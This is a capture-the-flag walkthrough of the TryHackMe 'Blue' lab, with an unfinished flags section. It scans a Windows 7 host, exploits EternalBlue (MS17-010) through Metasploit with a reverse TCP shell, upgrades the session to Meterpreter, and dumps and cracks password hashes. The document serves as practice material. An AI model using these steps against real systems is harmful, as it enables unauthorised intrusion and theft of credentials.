# BLUE
> 4lch3my | March 27, 2023
-------------------
#### This is a machine that allows you to practise web app hacking and privilege escalation
#### [Room Link](https://tryhackme.com/room/blue)

## Tasks
##### 1. Recon
  Scan and learn what exploit this machine is vulnerable to.

<br>

To start, I use [nmap] which is default option on the personal Kali install I have. We start with a basic command `nmap -sC -sV -A MACHINE_IP`
The `-sC` flag runs scripts against open ports as well to determine if there are external/common vulnerabilities that we can use outright. The `-sV` probes all open ports it finds to determine if we can get the service/version information. `-A` outputs in aggressive mode, so we can follow along with the commands and enumeration.
In our NMAP results we get:

```
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-26 18:10 UTC
Nmap scan report for MACHINE_IP (MACHINE_IP)
Host is up (0.00046s latency).
Not shown: 991 closed tcp ports (reset)
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
| rdp-ntlm-info: 
|   Target_Name: JON-PC
|   NetBIOS_Domain_Name: JON-PC
|   NetBIOS_Computer_Name: JON-PC
|   DNS_Domain_Name: Jon-PC
|   DNS_Computer_Name: Jon-PC
|   Product_Version: 6.1.7601
|_  System_Time: 2023-03-26T18:11:44+00:00
|_ssl-date: 2023-03-26T18:11:59+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=Jon-PC
| Not valid before: 2023-03-25T18:04:55
|_Not valid after:  2023-09-24T18:04:55
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 02:7D:FF:18:E3:75 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

Network Distance: 1 hop
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows .
Nmap done: 1 IP address (1 host up) scanned in 86.79 seconds
```

We can see multiple ports open, but the first thing what my eyes are drawn to is port `445` where a `Windows 7` service is running - `microsoft‑ds`. After a quick google around for `microsoft‑ds`, UI realized this is part of the famous `MS17-010` exploit titled `EternalBlue`. This is a vulnerability posted by Microsoft back in 2017 for vulnerable SMB v1 remote code execution issues. Now that we have what the machine is vulnerable to, time to actually exploit it

##### 2. Gain Access

Right away, let's start `metasploit` a common and very powerfull vulnerability exploiter tool. This can be started with the `msfconsole` command. 

<br>

Now, we can search for the `EternalBlue` vulnerability to see if there is a built in module for this in the tool. This cna be run with: `search eternalblue`

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_eternalblue.png?raw=true)

To select it, we can run: `use exploit/windows/smb/ms17_010_eternalblue`

And we can see what needs to be chnaged inside of the modeule with the `options` command:

msf exploit(ms17_010_eternalblue) > options

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_options.png?raw=true)

As we can see, we need to set the `RHOSTS` option, so the exploit can run automatically. We can do this by simply adding:

``` 
set RHOSTS 10.10.182.90
``` 

Also, as requested by the room owner, we will set the paylod to `reverese_tcp`:

``` 
set payload windows/x64/shell/reverse_tcp
``` 

Time to run the exploit:

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_run.png?raw=true)                                                                              

And there we go, we have access to the machine. On to Task 3
                                                                                              

##### 3. Escalate

The previously gained shell can now be background with the `CTRL + Z` command,  so we can continue down the rabbit hole.

<br>

And now we will convert our shell to a `meterpreter shell` right inside of `metasploit`! How exiting!

Run the command `search shell_to_meterpreter`:

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mmfs6_shell_to_met.png?raw=true)

Then `use post/multi/manage/shell_to_meterpreter` & list the sessions with `sessions`:

<br>

Switch:

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_sessions.png?raw=true)

And listing sessions: 

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_sessions2.png?raw=true)

Then `show options`:

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_show_options.png?raw=true)

Then `set SESSION 1` & run this upgraded exploit:

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_upgrade.png?raw=true)

Verify that it was successfull:

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_upgrade_sessions.png?raw=true)

And the last step, to actually switch to this upgraded `meterpreter` shell:

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs6_upgrade_sessions_verify.png?raw=true)

If you want to switch to a Powershell/Windows CMD shell, you can do by simple running: `shell`.

<br>

WOW! That was a mouthfull of infornmation! We can switch to the service `conhost.exe` OR `cmd.exe` on the machine for the verfication as well

##### 4. Cracking

After migration to one of the following services `conhost.exe` OR `cmd.exe` in task 3, we can now dump the passwords using the `hashdump` command:

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/mfs5_hash.png?raw=true)

To crack our users password we can use a site like [THIS ONE](https://crackstation.net/) to do the task for us automatically.

![alt text](https://github.com/4lch3my/WriteUps/blob/main/TryHackMe/TryHackMe%20-%20Blue/images/pasword.png?raw=true)

##### 5. Find flags!

1st flag

A of description > C:\Windows\System32

2nd flag



3rd flag
